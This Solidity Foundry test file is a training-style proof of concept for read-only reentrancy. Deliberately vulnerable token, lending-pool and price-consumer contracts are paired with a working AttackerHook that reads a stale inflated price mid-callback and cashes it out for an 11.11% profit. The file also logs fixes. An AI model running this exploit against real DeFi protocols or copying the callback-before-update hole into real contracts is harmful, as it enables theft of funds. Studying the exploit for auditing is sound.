// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import "forge-std/console2.sol";

// ============================================================
// DRILL 16: THE MIRROR'S LIE — PoC
// Read-only reentrancy via ERC777-style callbacks
// ============================================================

interface ITokenReceiver {
    function tokensReceived(
        address operator, address from, address to,
        uint256 amount, bytes calldata data
    ) external;
}

// ---- Bug #3: callback fires BEFORE state update ----
contract ReentrantToken {
    string public name = "HookToken";
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "insufficient");
        if (_hasHook(to)) {
            ITokenReceiver(to).tokensReceived(msg.sender, msg.sender, to, amount, "");
        }
        balanceOf[msg.sender] -= amount;  // AFTER callback
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "insufficient");
        require(allowance[from][msg.sender] >= amount, "not approved");
        if (_hasHook(to)) {
            ITokenReceiver(to).tokensReceived(msg.sender, from, to, amount, "");
        }
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function _hasHook(address addr) internal view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }
}

// ---- Bug #1: getVirtualPrice() stale during callback ----
// ---- Bug #2: nonReentrant does NOT protect view functions ----
contract LendingPool is ITokenReceiver {
    ReentrantToken public collateralToken;
    ReentrantToken public borrowToken;

    mapping(address => uint256) public collateral;
    mapping(address => uint256) public debt;
    uint256 public totalCollateral;
    uint256 public totalBorrowed;
    bool public locked;

    constructor(address _collateral, address _borrow) {
        collateralToken = ReentrantToken(_collateral);
        borrowToken = ReentrantToken(_borrow);
    }

    // Pool accepts hook tokens (needed so transferFrom into pool works)
    function tokensReceived(address, address, address, uint256, bytes calldata) external {}

    modifier nonReentrant() {
        require(!locked, "reentrancy");
        locked = true;
        _;
        locked = false;
    }

    function deposit(uint256 amount) external nonReentrant {
        collateralToken.transferFrom(msg.sender, address(this), amount);
        collateral[msg.sender] += amount;
        totalCollateral += amount;
    }

    function borrow(uint256 amount) external nonReentrant {
        uint256 collateralValue = collateral[msg.sender] * getVirtualPrice() / 1e18;
        uint256 newDebt = debt[msg.sender] + amount;
        require(collateralValue >= newDebt * 150 / 100, "undercollateralized");
        debt[msg.sender] = newDebt;
        totalBorrowed += amount;
        borrowToken.transfer(msg.sender, amount);
    }

    // VIEW — readable even while pool is locked mid-callback
    function getVirtualPrice() public view returns (uint256) {
        if (totalCollateral == 0) return 1e18;
        return collateralToken.balanceOf(address(this)) * 1e18 / totalCollateral;
    }

    function withdraw(uint256 amount) external nonReentrant {
        require(collateral[msg.sender] >= amount, "insufficient");
        uint256 remainingCollateral = collateral[msg.sender] - amount;
        uint256 remainingValue = remainingCollateral * getVirtualPrice() / 1e18;
        require(remainingValue >= debt[msg.sender] * 150 / 100, "undercollateralized");

        // Pool state updated BEFORE the token transfer...
        collateral[msg.sender] -= amount;
        totalCollateral -= amount;
        // ...but the TOKEN's balance is only updated AFTER its callback
        collateralToken.transfer(msg.sender, amount);
    }
}

// ---- Third-party protocol that trusts the pool's view (Bug #2 victim) ----
// Models real-world integrations (Aura reading Curve get_virtual_price, etc.)
contract PriceConsumer is ITokenReceiver {
    LendingPool public pool;
    ReentrantToken public collateralToken;
    ReentrantToken public borrowToken;

    constructor(address _pool, address _collateral, address _borrow) {
        pool = LendingPool(_pool);
        collateralToken = ReentrantToken(_collateral);
        borrowToken = ReentrantToken(_borrow);
    }

    function tokensReceived(address, address, address, uint256, bytes calldata) external {}

    // BUG #2: trusts getVirtualPrice() without checking pool.locked()
    function redeem(uint256 amount) external {
        uint256 price = pool.getVirtualPrice(); // STALE if called mid-callback
        uint256 payout = amount * price / 1e18;
        collateralToken.transferFrom(msg.sender, address(this), amount);
        borrowToken.transfer(msg.sender, payout);
    }
}

// ---- Attacker hook: opens the stale window + cashes out ----
contract AttackerHook is ITokenReceiver {
    bool public attackActive;
    LendingPool public pool;
    PriceConsumer public consumer;
    ReentrantToken public collateral;

    uint256 public stalePriceObserved;
    uint256 public redeemedPayout;

    constructor(address _pool, address _consumer, address _collateral) {
        pool = LendingPool(_pool);
        consumer = PriceConsumer(_consumer);
        collateral = ReentrantToken(_collateral);
    }

    function deposit(uint256 amount) external {
        collateral.approve(address(pool), amount);
        pool.deposit(amount);
    }

    function startAttack(uint256 withdrawAmount) external {
        attackActive = true;
        pool.withdraw(withdrawAmount); // callback fires inside this call
    }

    function tokensReceived(address, address, address, uint256, bytes calldata) external {
        if (!attackActive) return;
        attackActive = false; // one-shot

        // Price is INFLATED right now: totalCollateral already decremented,
        // pool's token balance not yet decremented (callback before state update)
        stalePriceObserved = pool.getVirtualPrice();

        // Cash out the stale price at the third-party consumer
        uint256 bal = collateral.balanceOf(address(this));
        collateral.approve(address(consumer), bal);
        uint256 before = consumer.borrowToken().balanceOf(address(this));
        consumer.redeem(bal);
        redeemedPayout = consumer.borrowToken().balanceOf(address(this)) - before;
    }
}

// ---- Honesty check hook: tries DIRECT reentrancy on a state function ----
contract DirectReentrancyHook is ITokenReceiver {
    bool public attackActive;
    bool public borrowSucceeded;
    LendingPool public pool;
    ReentrantToken public collateral;

    constructor(address _pool, address _collateral) {
        pool = LendingPool(_pool);
        collateral = ReentrantToken(_collateral);
    }

    function deposit(uint256 amount) external {
        collateral.approve(address(pool), amount);
        pool.deposit(amount);
    }

    function startAttack(uint256 withdrawAmount) external {
        attackActive = true;
        pool.withdraw(withdrawAmount);
    }

    function tokensReceived(address, address, address, uint256, bytes calldata) external {
        if (!attackActive) return;
        attackActive = false;
        // Direct reentrancy on state-changing function — should be blocked
        try pool.borrow(100e18) {
            borrowSucceeded = true;
        } catch {
            borrowSucceeded = false;
        }
    }
}

// ============================================================
// PoC TESTS
// ============================================================
contract Drill16PoC is Test {
    ReentrantToken collateralToken;
    ReentrantToken borrowToken;
    LendingPool pool;

    address owner = address(0x0B7);

    function setUp() public {
        collateralToken = new ReentrantToken();
        borrowToken = new ReentrantToken();
        pool = new LendingPool(address(collateralToken), address(borrowToken));

        // Owner deposits 4000 collateral; funds pool with 10,000 borrow tokens
        collateralToken.mint(owner, 4_000e18);
        borrowToken.mint(address(pool), 10_000e18);
        vm.startPrank(owner);
        collateralToken.approve(address(pool), type(uint256).max);
        pool.deposit(4_000e18);
        vm.stopPrank();
    }

    function _deployConsumerAndFund() internal returns (PriceConsumer) {
        PriceConsumer c = new PriceConsumer(address(pool), address(collateralToken), address(borrowToken));
        borrowToken.mint(address(c), 10_000e18); // consumer holds redeemable funds
        return c;
    }

    // ----------------------------------------------------------
    // PoC #1: Stale inflated price + third-party cash-out
    // ----------------------------------------------------------
    function test_PoC1_ReadOnlyReentrancyProfit() public {
        console2.log("=== PoC #1: Read-only reentrancy via stale view ===");

        PriceConsumer consumer = _deployConsumerAndFund();

        AttackerHook hook = new AttackerHook(address(pool), address(consumer), address(collateralToken));
        // 1000 to deposit (opens the window), 1000 held outside (cashed out at stale price)
        collateralToken.mint(address(hook), 2_000e18);
        hook.deposit(1_000e18);

        // Baseline: price is fair 1.0
        assertEq(pool.getVirtualPrice(), 1e18, "price before attack should be 1e18");
        console2.log("Price before attack: 1.0000e18 (fair)");
        console2.log("Pool state: balance=5000e18, totalCollateral=5000e18");

        // Attack: withdraw 500 FROM the hook -> callback fires mid-withdrawal
        hook.startAttack(500e18);

        uint256 stale = hook.stalePriceObserved();
        uint256 payout = hook.redeemedPayout();

        console2.log("Stale price observed inside callback: %s", stale);
        console2.log("Redeemed 1000 collateral tokens for:  %s borrow tokens", payout);

        // Exact math: totalCollateral = 5000-500 = 4500, pool balance still 5000
        // stale = 5000e18 * 1e18 / 4500e18 = 1.1111...e18
        assertEq(stale, 1_111_111_111_111_111_111, "stale price must be inflated 11.11%");

        // Payout = 1000e18 * stale / 1e18 = 1111.111...e18
        assertEq(payout, 1_111_111_111_111_111_111_000, "payout uses inflated price");
        assertGt(payout, 1_000e18, "attacker extracted MORE than fair value");

        // After callback: price snaps back to 1.0 (staleness was transient)
        assertEq(pool.getVirtualPrice(), 1e18, "price normalized after attack");
        console2.log("Price after attack:  1.0000e18 (back to normal - transient window)");

        uint256 profit = payout - 1_000e18;
        console2.log("[BUG] PROFIT: %s borrow tokens (+11.11%%) stolen from PriceConsumer", profit);
        console2.log("  Root cause: token callback fires before token state update,");
        console2.log("  while pool already decremented totalCollateral -> inflated ratio.");
        console2.log("  Fix: CEI everywhere, expose locked() check for consumers,");
        console2.log("       or drop token hooks.");
    }

    // ----------------------------------------------------------
    // PoC #2: Direct reentrancy on state fns IS blocked (honesty)
    // ----------------------------------------------------------
    function test_PoC2_DirectReentrancyBlocked() public {
        console2.log("=== PoC #2: Direct reentrancy BLOCKED by nonReentrant ===");

        DirectReentrancyHook hook = new DirectReentrancyHook(address(pool), address(collateralToken));
        collateralToken.mint(address(hook), 1_000e18);
        hook.deposit(1_000e18);

        hook.startAttack(500e18);

        assertEq(hook.borrowSucceeded(), false, "borrow inside callback must revert");
        console2.log("borrow() inside callback: REVERTS (nonReentrant works)");
        console2.log("[HONEST] Attacker CANNOT reenter state-changing functions.");
        console2.log("  The exploit REQUIRES a third-party consumer of the view.");
    }

    // ----------------------------------------------------------
    // PoC #3: Staleness window is exactly one callback deep
    // ----------------------------------------------------------
    function test_PoC3_PriceNormalization() public {
        console2.log("=== PoC #3: Staleness is transient ===");

        PriceConsumer consumer = _deployConsumerAndFund();
        AttackerHook hook = new AttackerHook(address(pool), address(consumer), address(collateralToken));
        collateralToken.mint(address(hook), 2_000e18);
        hook.deposit(1_000e18);

        hook.startAttack(500e18);

        // After the attack fully settles:
        uint256 price = pool.getVirtualPrice();
        uint256 poolBal = collateralToken.balanceOf(address(pool));
        uint256 total = pool.totalCollateral();

        console2.log("Pool balance: %s | totalCollateral: %s | price: %s", poolBal, total, price);
        assertEq(poolBal, 4_500e18, "pool balance settled");
        assertEq(total, 4_500e18, "totalCollateral settled");
        assertEq(price, 1e18, "price fully normalized");

        console2.log("[CONFIRMED] Stale window existed ONLY inside the callback.");
        console2.log("  Any consumer reading the view during that window is poisoned.");
    }
}
